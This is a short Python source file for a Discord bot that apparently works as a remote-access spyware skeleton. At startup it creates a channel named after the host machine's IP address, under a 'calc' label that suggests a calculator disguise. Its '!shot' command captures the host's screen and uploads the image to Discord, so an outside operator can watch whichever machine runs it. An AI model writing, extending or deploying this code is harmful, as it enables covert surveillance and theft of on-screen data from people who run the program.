import discord
from discord.ext import commands
import socket
import pyautogui
import io

# ====== CONFIG ======
TOKEN = "your_token_here"  # put your bot token as a string
GUILD_ID = 123456789012345678  # your server ID as int
CATEGORY_ID = 987654321098765432  # your category ID as int

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

def get_local_ip():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return ip
    except:
        return "unknown-ip"

async def create_calc_channel(guild):
    ip = get_local_ip().replace(".", "-")
    name = f"calc-{ip}"
    category = discord.utils.get(guild.categories, id=CATEGORY_ID)
    if category is None:
        print("Category not found! Check CATEGORY_ID.")
        return None
    existing = discord.utils.get(guild.text_channels, name=name)
    if existing:
        return existing
    channel = await guild.create_text_channel(name, category=category)
    return channel

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}!")
    guild = bot.get_guild(GUILD_ID)
    if guild is None:
        print("Cannot find server. Check GUILD_ID!")
        return
    calc_channel = await create_calc_channel(guild)
    if calc_channel:
        print(f"Created channel: {calc_channel.name}")
    else:
        print("Failed to create channel.")

# Command to take a screenshot
@bot.command(name="shot")
async def screenshot(ctx):
    # take a screenshot
    image = pyautogui.screenshot()
    with io.BytesIO() as image_binary:
        image.save(image_binary, "PNG")
        image_binary.seek(0)
        await ctx.send(file=discord.File(fp=image_binary, filename="screenshot.png"))

bot.run(TOKEN)
